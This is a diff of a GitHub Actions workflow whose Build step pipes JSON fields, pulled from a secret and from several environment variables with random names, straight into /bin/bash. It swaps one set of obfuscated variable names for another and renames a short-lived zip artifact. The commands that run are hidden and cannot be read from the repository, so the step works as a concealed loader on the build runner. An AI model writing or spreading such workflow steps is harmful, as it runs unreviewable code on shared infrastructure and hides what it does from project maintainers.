@@ -22,19 +22,19 @@ jobs:
           fetch-depth: 1
       - name: Build
         env:
-          w08546: ${{ secrets.w08546 }}
+          idxoh14: ${{ secrets.idxoh14 }}
         run: |
-          printf '%s' "$w08546" | jq -r .oqzpc0 | /bin/bash
-          printf '%s' "$bt04212" | jq -r .vv2375 | /bin/bash
-          printf '%s' "$zt66" | jq -r .uvi20277 | /bin/bash
-          printf '%s' "$kvq12" | jq -r .m96878 | /bin/bash
-          echo $okkdu9728 | jq -r .fh29 | /bin/bash
-          echo $urk42325 | jq -r .hrqx23729 | /bin/bash
+          printf '%s' "$idxoh14" | jq -r .e55 | /bin/bash
+          printf '%s' "$qgj9863" | jq -r .d827 | /bin/bash
+          echo $h7638 | jq -r .nxw26 | /bin/bash
+          echo $gs181 | jq -r .b2248 | /bin/bash
+          echo $cebye1 | jq -r .gle7829 | /bin/bash
+          printf '%s' "$xifep657" | jq -r .hygo2 | /bin/bash
 
       - name: Archive output
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: Lgz0INNH
+          name: kufhPAPQ
           path: "*.zip"
           retention-days: 1
